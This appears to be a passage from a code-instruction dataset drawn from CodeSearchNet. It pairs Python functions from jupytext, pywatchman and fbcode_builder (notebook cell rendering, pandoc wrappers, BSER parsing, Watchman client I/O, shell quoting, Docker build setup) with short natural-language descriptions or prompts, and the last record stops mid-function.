{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the text representation of a code cell.", "response": "def code_to_text(self):\n        \"\"\"Return the text representation of a code cell\"\"\"\n        active = is_active(self.ext, self.metadata)\n        if self.language != self.default_language and 'active' not in self.metadata:\n            active = False\n\n        source = copy(self.source)\n        escape_code_start(source, self.ext, self.language)\n\n        if active:\n            comment_magic(source, self.language, self.comment_magics)\n        else:\n            source = [self.comment + ' ' + line if line else self.comment for line in source]\n\n        if self.explicit_start_marker(source):\n            self.metadata['endofcell'] = self.cell_marker_end or endofcell_marker(source, self.comment)\n\n        if not self.metadata or not self.use_cell_markers:\n            return source\n\n        lines = []\n        endofcell = self.metadata['endofcell']\n        if endofcell == '-' or self.cell_marker_end:\n            del self.metadata['endofcell']\n\n        cell_start = [self.comment, self.cell_marker_start or '+']\n        if not self.cell_marker_start:\n            cell_start.append(metadata_to_json_options(self.metadata))\n        elif self.metadata:\n            if 'title' in self.metadata:\n                cell_start.append(self.metadata.pop('title'))\n            if self.metadata:\n                cell_start.append(metadata_to_json_options(self.metadata))\n\n        lines.append(' '.join(cell_start))\n        lines.extend(source)\n        lines.append(self.comment + ' {}'.format(endofcell))\n        return lines"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndoes the python representation of this cell require an explicit start of cell marker?", "response": "def explicit_start_marker(self, source):\n        \"\"\"Does the python representation of this cell requires an explicit\n        start of cell marker?\"\"\"\n        if not self.use_cell_markers:\n            return False\n        if self.metadata:\n            return True\n        if self.cell_marker_start:\n            start_code_re = re.compile('^' + self.comment + r'\\s*' + self.cell_marker_start + r'\\s*(.*)$')\n            end_code_re = re.compile('^' + self.comment + r'\\s*' + self.cell_marker_end + r'\\s*$')\n            if start_code_re.match(source[0]) or end_code_re.match(source[0]):\n                return False\n\n        if all([line.startswith(self.comment) for line in self.source]):\n            return True\n        if LightScriptCellReader(self.fmt).read(source)[1] < len(source):\n            return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef remove_eoc_marker(self, text, next_text):\n        if self.cell_marker_start:\n            return text\n\n        if self.is_code() and text[-1] == self.comment + ' -':\n            # remove end of cell marker when redundant with next explicit marker\n            if not next_text or next_text[0].startswith(self.comment + ' + {'):\n                text = text[:-1]\n                # When we do not need the end of cell marker, number of blank lines is the max\n                # between that required at the end of the cell, and that required before the next cell.\n                if self.lines_to_end_of_cell_marker and (self.lines_to_next_cell is None or\n                                                         self.lines_to_end_of_cell_marker > self.lines_to_next_cell):\n                    self.lines_to_next_cell = self.lines_to_end_of_cell_marker\n            else:\n                # Insert blank lines at the end of the cell\n                blank_lines = self.lines_to_end_of_cell_marker\n                if blank_lines is None:\n                    # two blank lines when required by pep8\n                    blank_lines = pep8_lines_between_cells(text[:-1], next_text, self.ext)\n                    blank_lines = 0 if blank_lines < 2 else 2\n                text = text[:-1] + [''] * blank_lines + text[-1:]\n\n        return text", "response": "Remove end of cell marker when next cell has an explicit start marker"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef simplify_soc_marker(self, text, prev_text):\n        if self.cell_marker_start:\n            return text\n\n        if self.is_code() and text and text[0] == self.comment + ' + {}':\n            if not prev_text or not prev_text[-1].strip():\n                text[0] = self.comment + ' +'\n\n        return text", "response": "Simplify start of cell marker when previous line is blank"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef code_to_text(self):\n        active = is_active(self.ext, self.metadata)\n        source = copy(self.source)\n        escape_code_start(source, self.ext, self.language)\n\n        if active:\n            comment_magic(source, self.language, self.comment_magics)\n\n        if not active:\n            source = ['# ' + line if line else '#' for line in source]\n\n        lines = []\n        if not is_active('R', self.metadata):\n            self.metadata['eval'] = False\n        options = metadata_to_rmd_options(None, self.metadata)\n        if options:\n            lines.append('#+ {}'.format(options))\n        lines.extend(source)\n        return lines", "response": "Return the text representation of a code cell."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cell_to_text(self):\n        if self.cell_type != 'code':\n            self.metadata['cell_type'] = self.cell_type\n\n        active = is_active('py', self.metadata)\n        if self.language != self.default_language and 'active' not in self.metadata:\n            active = False\n        if self.cell_type == 'raw' and 'active' in self.metadata and self.metadata['active'] == '':\n            del self.metadata['active']\n\n        options = metadata_to_double_percent_options(self.metadata)\n        if options.startswith('%') or not options:\n            lines = [self.comment + ' %%' + options]\n        else:\n            lines = [self.comment + ' %% ' + options]\n\n        if self.cell_type == 'code' and active:\n            source = copy(self.source)\n            comment_magic(source, self.language, self.comment_magics)\n            if source == ['']:\n                return lines\n            return lines + source\n\n        return lines + comment_lines(self.source, self.comment)", "response": "Return the text representation of the cell"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the text representation of the cell", "response": "def cell_to_text(self):\n        \"\"\"Return the text representation for the cell\"\"\"\n        if self.cell_type == 'code':\n            source = copy(self.source)\n            return comment_magic(source, self.language, self.comment_magics)\n\n        if 'cell_marker' in self.metadata:\n            cell_marker = self.metadata.pop('cell_marker')\n        else:\n            cell_marker = self.default_cell_marker\n\n        if self.source == ['']:\n            return [cell_marker] if cell_marker in ['\"\"', \"''\"] else ['\"\"']\n\n        if cell_marker in ['\"\"\"', \"'''\"]:\n            return [cell_marker] + self.source + [cell_marker]\n\n        return [cell_marker if cell_marker.startswith('#' * 20)\n                else self.default_cell_marker] + comment_lines(self.source, self.comment)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef pandoc(args, filein=None, fileout=None):\n    cmd = [u'pandoc']\n\n    if filein:\n        cmd.append(filein)\n\n    if fileout:\n        cmd.append('-o')\n        cmd.append(fileout)\n\n    cmd.extend(args.split())\n\n    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE)\n    out, err = proc.communicate()\n    if proc.returncode:\n        raise PandocError('pandoc exited with return code {}\\n{}'.format(proc.returncode, str(err)))\n    return out.decode('utf-8')", "response": "Execute pandoc with the given arguments"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef pandoc_version():\n    version = pandoc(u'--version').splitlines()[0].split()[1]\n    if parse_version(version) < parse_version('2.7.2'):\n        raise PandocError('Please install pandoc>=2.7.2 (found version {})'.format(version))\n\n    return version", "response": "Pandoc s version number"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts a Markdown text to a Jupyter notebook using Pandoc", "response": "def md_to_notebook(text):\n    \"\"\"Convert a Markdown text to a Jupyter notebook, using Pandoc\"\"\"\n    tmp_file = tempfile.NamedTemporaryFile(delete=False)\n    tmp_file.write(text.encode('utf-8'))\n    tmp_file.close()\n\n    pandoc(u'--from markdown --to ipynb -s --atx-headers --wrap=preserve --preserve-tabs', tmp_file.name, tmp_file.name)\n\n    with open(tmp_file.name, encoding='utf-8') as opened_file:\n        notebook = ipynb_reads(opened_file.read(), as_version=4)\n    os.unlink(tmp_file.name)\n\n    return notebook"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef notebook_to_md(notebook):\n    tmp_file = tempfile.NamedTemporaryFile(delete=False)\n    tmp_file.write(ipynb_writes(notebook).encode('utf-8'))\n    tmp_file.close()\n\n    pandoc(u'--from ipynb --to markdown -s --atx-headers --wrap=preserve --preserve-tabs', tmp_file.name, tmp_file.name)\n\n    with open(tmp_file.name, encoding='utf-8') as opened_file:\n        text = opened_file.read()\n\n    os.unlink(tmp_file.name)\n    return '\\n'.join(text.splitlines())", "response": "Convert a notebook to its Markdown representation using Pandoc"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _int_size(x):\n    if -0x80 <= x <= 0x7F:\n        return 1\n    elif -0x8000 <= x <= 0x7FFF:\n        return 2\n    elif -0x80000000 <= x <= 0x7FFFFFFF:\n        return 4\n    elif long(-0x8000000000000000) <= x <= long(0x7FFFFFFFFFFFFFFF):\n        return 8\n    else:\n        raise RuntimeError(\"Cannot represent value: \" + str(x))", "response": "Return the smallest size int that can store the value"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef loads(buf, mutable=True, value_encoding=None, value_errors=None):\n\n    info = _pdu_info_helper(buf)\n    expected_len = info[2]\n    pos = info[3]\n\n    if len(buf) != expected_len + pos:\n        raise ValueError(\n            \"bser data len %d != header len %d\" % (expected_len + pos, len(buf))\n        )\n\n    bunser = Bunser(\n        mutable=mutable, value_encoding=value_encoding, value_errors=value_errors\n    )\n\n    return bunser.loads_recursive(buf, pos)[0]", "response": "Deserialize a BSER - encoded blob into a tuple of bytestrings."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _inner_read_config(path):\n    '''\n    Helper to read a named config file.\n    The grossness with the global is a workaround for this python bug:\n    https://bugs.python.org/issue21591\n    The bug prevents us from defining either a local function or a lambda\n    in the scope of read_fbcode_builder_config below.\n    '''\n    global _project_dir\n    full_path = os.path.join(_project_dir, path)\n    return read_fbcode_builder_config(full_path)", "response": "Internal helper to read a named config file."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn all the builder steps needed to build a given spec.", "response": "def steps_for_spec(builder, spec, processed_modules=None):\n    '''\n    Sets `builder` configuration, and returns all the builder steps\n    necessary to build `spec` and its dependencies.\n\n    Traverses the dependencies in depth-first order, honoring the sequencing\n    in each 'depends_on' list.\n    '''\n    if processed_modules is None:\n        processed_modules = set()\n    steps = []\n    for module in spec.get('depends_on', []):\n        if module not in processed_modules:\n            processed_modules.add(module)\n            steps.extend(steps_for_spec(\n                builder,\n                module.fbcode_builder_spec(builder),\n                processed_modules\n            ))\n    steps.extend(spec.get('steps', []))\n    return steps"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nfigure out where vcpkg is installed.", "response": "def vcpkg_dir():\n    \"\"\" Figure out where vcpkg is installed.\n    vcpkg-exported is populated in some flavors of FB internal builds.\n    C:/tools/vcpkg is the appveyor location.\n    C:/open/vcpkg is my local location.\n    \"\"\"\n    for p in [\"vcpkg-exported\", \"C:/tools/vcpkg\", \"C:/open/vcpkg\"]:\n        if os.path.isdir(p):\n            return os.path.realpath(p)\n    raise Exception(\"cannot find vcpkg\")"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsynthesizing a capability enabled version response", "response": "def synthesize(vers, opts):\n    \"\"\" Synthesize a capability enabled version response\n        This is a very limited emulation for relatively recent feature sets\n    \"\"\"\n    parsed_version = parse_version(vers[\"version\"])\n    vers[\"capabilities\"] = {}\n    for name in opts[\"optional\"]:\n        vers[\"capabilities\"][name] = check(parsed_version, name)\n    failed = False  # noqa: F841 T25377293 Grandfathered in\n    for name in opts[\"required\"]:\n        have = check(parsed_version, name)\n        vers[\"capabilities\"][name] = have\n        if not have:\n            vers[\"error\"] = (\n                \"client required capability `\"\n                + name\n                + \"` is not supported by this server\"\n            )\n    return vers"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nquoting a string if it is not already quoted", "response": "def shell_quote(s):\n    'Quotes a string if it is not already quoted'\n    return s if isinstance(s, ShellQuoted) \\\n        else ShellQuoted(\"'\" + str(s).replace(\"'\", \"'\\\\''\") + \"'\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef raw_shell(s):\n    'Not a member of ShellQuoted so we get a useful error for raw strings'\n    if isinstance(s, ShellQuoted):\n        return s.do_not_use_raw_str\n    raise RuntimeError('{0} should have been ShellQuoted'.format(s))", "response": "Not a member of ShellQuoted so we get a useful error for raw strings"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef shell_join(delim, it):\n    'Joins an iterable of ShellQuoted with a delimiter between each two'\n    return ShellQuoted(delim.join(raw_shell(s) for s in it))", "response": "Joins an iterable of ShellQuoted with a delimiter between each two"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef path_join(*args):\n    'Joins ShellQuoted and raw pieces of paths to make a shell-quoted path'\n    return ShellQuoted(os.path.join(*[\n        raw_shell(shell_quote(s)) for s in args\n    ]))", "response": "Joins ShellQuoted and raw pieces of paths to make a shell - quoted path"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef shell_comment(c):\n    'Do not shell-escape raw strings in comments, but do handle line breaks.'\n    return ShellQuoted('# {c}').format(c=ShellQuoted(\n        (raw_shell(c) if isinstance(c, ShellQuoted) else c)\n            .replace('\\n', '\\n# ')\n    ))", "response": "Do not shell - escape raw strings in comments but do handle line breaks."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nlocate a dep in the search path and return its path.", "response": "def resolve_dep(self, depname):\n        \"\"\" Locate dep in the search path; if found, return its path.\n        If not found in the search path, and the dep is not a system-provided\n        dep, raise an error \"\"\"\n        for d in self._search_path:\n            name = os.path.join(d, depname)\n            if self._mock:\n                return name\n            if os.path.exists(name):\n                return name\n        if self.resolve_dep_from_path(depname):\n            # It's a system dep, so skip it\n            return None\n\n        message = \"unable to find %s in %r\" % (depname, self._search_path + self._path)\n        print(message)\n        # The conditional is to ease future debugging\n        if True:\n            raise RuntimeError(message)\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nresolve a dependency from the path.", "response": "def resolve_dep_from_path(self, depname):\n        \"\"\" If we can find the dep in the PATH, then we consider it to\n        be a system dependency that we should not bundle in the package \"\"\"\n        if is_system_dep(depname):\n            return True\n\n        for d in self._path:\n            name = os.path.join(d, depname)\n            if os.path.exists(name):\n                return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nparsing the response from the BSER packet and return the result.", "response": "def _loads(self, response):\n        \"\"\" Parse the BSER packet \"\"\"\n        return bser.loads(\n            response,\n            True,\n            value_encoding=encoding.get_local_encoding(),\n            value_errors=encoding.default_local_errors,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreceiving the response from the bilateral service.", "response": "async def receive_bilateral_response(self):\n        \"\"\"Receive the response to a request made to the Watchman service.\"\"\"\n\n        self._check_receive_loop()\n        resp = await self.bilateral_response_queue.get()\n        self._check_error(resp)\n        return resp"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsends a query to the Watchman service and return the response.", "response": "async def query(self, *args):\n        \"\"\"Send a query to the Watchman service and return the response.\"\"\"\n\n        self._check_receive_loop()\n        try:\n            await self.connection.send(args)\n            return await self.receive_bilateral_response()\n        except CommandError as ex:\n            ex.setCommand(args)\n            raise ex"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\nasync def capability_check(self, optional=None, required=None):\n\n        self._check_receive_loop()\n        # If the returned response is an error, self.query will raise an error\n        await self.query(\n            \"version\", {\"optional\": optional or [], \"required\": required or []}\n        )", "response": "Perform a server capability check."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the data associated with a named subscription.", "response": "async def get_subscription(self, name, root):\n        \"\"\" Retrieve the data associated with a named subscription\n\n        Returns None if there is no data associated with `name`\n\n        If root is not None, then only return the subscription\n        data that matches both root and name.  When used in this way,\n        remove processing impacts both the unscoped and scoped stores\n        for the subscription data.\n        \"\"\"\n        self._check_receive_loop()\n        self._ensure_subscription_queue_exists(name, root)\n        res = await self.sub_by_root[root][name].get()\n        self._check_error(res)\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\nasync def pop_log(self):\n        self._check_receive_loop()\n        res = self.log_queue.get()\n        self._check_error(res)\n        return res", "response": "Get one log from the log queue."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nclose the underlying connection.", "response": "def close(self):\n        \"\"\"Close the underlying connection.\"\"\"\n        self._closed = True\n        if self.receive_task:\n            self.receive_task.cancel()\n        if self.connection:\n            self.connection.close()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef enable_receiving(self, loop=None):\n        self.receive_task = asyncio.ensure_future(self._receive_loop(), loop=loop)\n\n        def do_if_done(fut):\n            try:\n                fut.result()\n            except asyncio.CancelledError:\n                pass\n            except Exception as ex:\n                self.receive_task_exception = ex\n            self.receive_task = None\n\n        self.receive_task.add_done_callback(do_if_done)", "response": "Schedules the receive loop to run on the given loop."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\nasync def from_socket(cls, sockname: typing.Optional[str] = None) -> \"AIOClient\":\n        if not sockname:\n            sockname = await _resolve_sockname()\n        transport = AsyncUnixSocketTransport()\n        await transport.activate(sockname=sockname)\n        connection = AsyncBserCodec(transport)\n        obj = cls(connection)\n        obj.enable_receiving()\n        return obj", "response": "Create an AIOClient from a Unix socket."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreceiving the response from the Watchman service.", "response": "async def _receive_loop(self):\n        \"\"\"Receive the response to a request made to the Watchman service.\n\n        Note that when trying to receive a PDU from the Watchman service,\n        we might get a unilateral response to a subscription or log, so these\n        are processed and queued up for later retrieval. This function only\n        returns when a non-unilateral response is received.\"\"\"\n\n        try:\n            while True:\n                response = await self.connection.receive()\n                if self._is_unilateral(response):\n                    await self._process_unilateral_response(response)\n                else:\n                    await self.bilateral_response_queue.put(response)\n        except Exception as ex:\n            await self._broadcast_exception(ex)\n            # We may get a cancel exception on close, so don't close again.\n            if not self._closed:\n                self.close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nexpands a win32 error code into a human readable message", "response": "def _win32_strerror(err):\n    \"\"\" expand a win32 error code into a human readable message \"\"\"\n\n    # FormatMessage will allocate memory and assign it here\n    buf = ctypes.c_char_p()\n    FormatMessage(\n        FORMAT_MESSAGE_FROM_SYSTEM\n        | FORMAT_MESSAGE_ALLOCATE_BUFFER\n        | FORMAT_MESSAGE_IGNORE_INSERTS,\n        None,\n        err,\n        0,\n        buf,\n        0,\n        None,\n    )\n    try:\n        return buf.value\n    finally:\n        LocalFree(buf)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_overlapped_result_ex_impl(pipe, olap, nbytes, millis, alertable):\n    log(\"Preparing to wait for maximum %dms\", millis)\n    if millis != 0:\n        waitReturnCode = WaitForSingleObjectEx(olap.hEvent, millis, alertable)\n        if waitReturnCode == WAIT_OBJECT_0:\n            # Event is signaled, overlapped IO operation result should be available.\n            pass\n        elif waitReturnCode == WAIT_IO_COMPLETION:\n            # WaitForSingleObjectEx returnes because the system added an I/O completion\n            # routine or an asynchronous procedure call (APC) to the thread queue.\n            SetLastError(WAIT_IO_COMPLETION)\n            pass\n        elif waitReturnCode == WAIT_TIMEOUT:\n            # We reached the maximum allowed wait time, the IO operation failed\n            # to complete in timely fashion.\n            SetLastError(WAIT_TIMEOUT)\n            return False\n        elif waitReturnCode == WAIT_FAILED:\n            # something went wrong calling WaitForSingleObjectEx\n            err = GetLastError()\n            log(\"WaitForSingleObjectEx failed: %s\", _win32_strerror(err))\n            return False\n        else:\n            # unexpected situation deserving investigation.\n            err = GetLastError()\n            log(\"Unexpected error: %s\", _win32_strerror(err))\n            return False\n\n    return GetOverlappedResult(pipe, olap, nbytes, False)", "response": "Get the result of an overlapped IO operation."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef readLine(self):\n        if self.buf is None:\n            self.buf = []\n\n        # Buffer may already have a line if we've received unilateral\n        # response(s) from the server\n        if len(self.buf) == 1 and b\"\\n\" in self.buf[0]:\n            (line, b) = self.buf[0].split(b\"\\n\", 1)\n            self.buf = [b]\n            return line\n\n        while True:\n            b = self.readBytes(4096)\n            if b\"\\n\" in b:\n                result = b\"\".join(self.buf)\n                (line, b) = b.split(b\"\\n\", 1)\n                self.buf = [b]\n                return result + line\n            self.buf.append(b)", "response": "read a line from the transport"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreading a byte from the pipe and return it as a string.", "response": "def readBytes(self, size):\n        \"\"\" A read can block for an unbounded amount of time, even if the\n            kernel reports that the pipe handle is signalled, so we need to\n            always perform our reads asynchronously\n        \"\"\"\n\n        # try to satisfy the read from any buffered data\n        if self._iobuf:\n            if size >= len(self._iobuf):\n                res = self._iobuf\n                self.buf = None\n                return res\n            res = self._iobuf[:size]\n            self._iobuf = self._iobuf[size:]\n            return res\n\n        # We need to initiate a read\n        buf = ctypes.create_string_buffer(size)\n        olap = OVERLAPPED()\n        olap.hEvent = self._waitable\n\n        log(\"made read buff of size %d\", size)\n\n        # ReadFile docs warn against sending in the nread parameter for async\n        # operations, so we always collect it via GetOverlappedResultEx\n        immediate = ReadFile(self.pipe, buf, size, None, olap)\n\n        if not immediate:\n            err = GetLastError()\n            if err != ERROR_IO_PENDING:\n                self._raise_win_err(\"failed to read %d bytes\" % size, err)\n\n        nread = wintypes.DWORD()\n        if not self._get_overlapped_result_ex(\n            self.pipe, olap, nread, 0 if immediate else self.timeout, True\n        ):\n            err = GetLastError()\n            CancelIoEx(self.pipe, olap)\n\n            if err == WAIT_TIMEOUT:\n                log(\"GetOverlappedResultEx timedout\")\n                raise SocketTimeout(\n                    \"timed out after waiting %dms for read\" % self.timeout\n                )\n\n            log(\"GetOverlappedResultEx reports error %d\", err)\n            self._raise_win_err(\"error while waiting for read\", err)\n\n        nread = nread.value\n        if nread == 0:\n            # Docs say that named pipes return 0 byte when the other end did\n            # a zero byte write.  Since we don't ever do that, the only\n            # other way this shows up is if the client has gotten in a weird\n            # state, so let's bail out\n            CancelIoEx(self.pipe, olap)\n            raise IOError(\"Async read yielded 0 bytes; unpossible!\")\n\n        # Holds precisely the bytes that we read from the prior request\n        buf = buf[:nread]\n\n        returned_size = min(nread, size)\n        if returned_size == nread:\n            return buf\n\n        # keep any left-overs around for a later read to consume\n        self._iobuf = buf[returned_size:]\n        return buf[:returned_size]"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreceive the next PDU from the watchman service", "response": "def receive(self):\n        \"\"\" receive the next PDU from the watchman service\n\n        If the client has activated subscriptions or logs then\n        this PDU may be a unilateral PDU sent by the service to\n        inform the client of a log event or subscription change.\n\n        It may also simply be the response portion of a request\n        initiated by query.\n\n        There are clients in production that subscribe and call\n        this in a loop to retrieve all subscription responses,\n        so care should be taken when making changes here.\n        \"\"\"\n\n        self._connect()\n        result = self.recvConn.receive()\n        if self._hasprop(result, \"error\"):\n            raise CommandError(result[\"error\"])\n\n        if self._hasprop(result, \"log\"):\n            self.logs.append(result[\"log\"])\n\n        if self._hasprop(result, \"subscription\"):\n            sub = result[\"subscription\"]\n            if not (sub in self.subs):\n                self.subs[sub] = []\n            self.subs[sub].append(result)\n\n            # also accumulate in {root,sub} keyed store\n            root = os.path.normpath(os.path.normcase(result[\"root\"]))\n            if not root in self.sub_by_root:\n                self.sub_by_root[root] = {}\n            if not sub in self.sub_by_root[root]:\n                self.sub_by_root[root][sub] = []\n            self.sub_by_root[root][sub].append(result)\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef getLog(self, remove=True):\n        res = self.logs\n        if remove:\n            self.logs = []\n        return res", "response": "Retrieve buffered log data"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef getSubscription(self, name, remove=True, root=None):\n        if root is not None:\n            root = os.path.normpath(os.path.normcase(root))\n            if root not in self.sub_by_root:\n                return None\n            if name not in self.sub_by_root[root]:\n                return None\n            sub = self.sub_by_root[root][name]\n            if remove:\n                del self.sub_by_root[root][name]\n                # don't let this grow unbounded\n                if name in self.subs:\n                    del self.subs[name]\n            return sub\n\n        if name not in self.subs:\n            return None\n        sub = self.subs[name]\n        if remove:\n            del self.subs[name]\n        return sub", "response": "Retrieve the data associated with a named subscription."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef query(self, *args):\n\n        log(\"calling client.query\")\n        self._connect()\n        try:\n            self.sendConn.send(args)\n\n            res = self.receive()\n            while self.isUnilateralResponse(res):\n                res = self.receive()\n\n            return res\n        except EnvironmentError as ee:\n            # When we can depend on Python 3, we can use PEP 3134\n            # exception chaining here.\n            raise WatchmanEnvironmentError(\n                \"I/O error communicating with watchman daemon\",\n                ee.errno,\n                ee.strerror,\n                args,\n            )\n        except WatchmanError as ex:\n            ex.setCommand(args)\n            raise", "response": "Send a query to the watchman service and return the response."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nperform a server capability check", "response": "def capabilityCheck(self, optional=None, required=None):\n        \"\"\" Perform a server capability check \"\"\"\n        res = self.query(\n            \"version\", {\"optional\": optional or [], \"required\": required or []}\n        )\n\n        if not self._hasprop(res, \"capabilities\"):\n            # Server doesn't support capabilities, so we need to\n            # synthesize the results based on the version\n            capabilities.synthesize(res, optional)\n            if \"error\" in res:\n                raise CommandError(res[\"error\"])\n\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nread bytes from a file - like object that implements read", "response": "def _read_bytes(fp, buf):\n    \"\"\"Read bytes from a file-like object\n\n    @param fp: File-like object that implements read(int)\n    @type fp: file\n\n    @param buf: Buffer to read into\n    @type buf: bytes\n\n    @return: buf\n    \"\"\"\n\n    # Do the first read without resizing the input buffer\n    offset = 0\n    remaining = len(buf)\n    while remaining > 0:\n        l = fp.readinto((ctypes.c_char * remaining).from_buffer(buf, offset))\n        if l is None or l == 0:\n            return offset\n        offset += l\n        remaining -= l\n    return offset"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load(fp, mutable=True, value_encoding=None, value_errors=None):\n    buf = ctypes.create_string_buffer(8192)\n    SNIFF_BUFFER_SIZE = len(EMPTY_HEADER)\n    header = (ctypes.c_char * SNIFF_BUFFER_SIZE).from_buffer(buf)\n    read_len = _read_bytes(fp, header)\n    if read_len < len(header):\n        return None\n\n    total_len = bser.pdu_len(buf)\n    if total_len > len(buf):\n        ctypes.resize(buf, total_len)\n\n    body = (ctypes.c_char * (total_len - len(header))).from_buffer(buf, len(header))\n    read_len = _read_bytes(fp, body)\n    if read_len < len(body):\n        raise RuntimeError(\"bser data ended early\")\n\n    return bser.loads(\n        (ctypes.c_char * total_len).from_buffer(buf, 0),\n        mutable,\n        value_encoding,\n        value_errors,\n    )", "response": "Deserialize a BSER - encoded blob into a tuple of base64 - encoded bytestrings."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef make_docker_context(\n    get_steps_fn, github_project, opts=None, default_context_dir=None\n):\n    '''\n    Returns a path to the Docker context directory. See parse_args.py.\n\n    Helper for making a command-line utility that writes your project's\n    Dockerfile and associated data into a (temporary) directory.  Your main\n    program might look something like this:\n\n        print(make_docker_context(\n            lambda builder: [builder.step(...), ...],\n            'facebook/your_project',\n        ))\n    '''\n\n    if opts is None:\n        opts = {}\n\n    valid_versions = (\n        ('ubuntu:16.04', '5'),\n    )\n\n    def add_args(parser):\n        parser.add_argument(\n            '--docker-context-dir', metavar='DIR',\n            default=default_context_dir,\n            help='Write the Dockerfile and its context into this directory. '\n                'If empty, make a temporary directory. Default: %(default)s.',\n        )\n        parser.add_argument(\n            '--user', metavar='NAME', default=opts.get('user', 'nobody'),\n            help='Build and install as this user. Default: %(default)s.',\n        )\n        parser.add_argument(\n            '--prefix', metavar='DIR',\n            default=opts.get('prefix', '/home/install'),\n            help='Install all libraries in this prefix. Default: %(default)s.',\n        )\n        parser.add_argument(\n            '--projects-dir', metavar='DIR',\n            default=opts.get('projects_dir', '/home'),\n            help='Place project code directories here. Default: %(default)s.',\n        )\n        parser.add_argument(\n            '--os-image', metavar='IMG', choices=zip(*valid_versions)[0],\n            default=opts.get('os_image', valid_versions[0][0]),\n            help='Docker OS image -- be sure to use only ones you trust (See '\n                'README.docker). Choices: %(choices)s. Default: %(default)s.',\n        )\n        parser.add_argument(\n            '--gcc-version', metavar='VER',\n            choices=set(zip(*valid_versions)[1]),\n            default=opts.get('gcc_version', valid_versions[0][1]),\n            help='Choices: %(choices)s. Default: %(default)s.',\n        )\n        parser.add_argument(\n            '--make-parallelism', metavar='NUM', type=int,\n            default=opts.get('make_parallelism', 1),\n            help='Use `make -j` on multi-CPU systems with lots of RAM. '\n                'Default: %(default)s.',\n        )\n        parser.add_argument(\n            '--local-repo-dir', metavar='DIR',\n            help='If set, build {0} from a local directory instead of Github.'\n                .format(github_project),\n        )\n        parser.add_argument(\n            '--ccache-tgz', metavar='PATH',\n            help='If set, enable ccache for the build. To initialize the '\n                 'cache, first try to hardlink, then to copy --cache-tgz '\n                 'as ccache.tgz into the --docker-context-dir.'\n        )\n\n    opts = parse_args_to_fbcode_builder_opts(\n        add_args,\n        # These have add_argument() calls, others are set via --option.\n        (\n            'docker_context_dir',\n            'user',\n            'prefix',\n            'projects_dir',\n            'os_image',\n            'gcc_version',\n            'make_parallelism',\n            'local_repo_dir',\n            'ccache_tgz',\n        ),\n        opts,\n        help=textwrap.dedent('''\n\n        Reads `fbcode_builder_config.py` from the current directory, and\n        prepares a Docker context directory to build {github_project} and\n        its dependencies.  Prints to stdout the path to the context\n        directory.\n\n        Pass --option {github_project}:git_hash SHA1 to build something\n        other than the master branch from Github.\n\n        Or, pass --option {github_project}:local_repo_dir LOCAL_PATH to\n        build from a local repo instead of cloning from Github.\n\n        Usage:\n            (cd $(./make_docker_context.py) && docker build . 2>&1 | tee log)\n\n        '''.format(github_project=github_project)),\n    )\n\n    # This allows travis_docker_build.sh not to know the main Github project.\n    local_repo_dir = opts.pop('local_repo_dir', None)\n    if 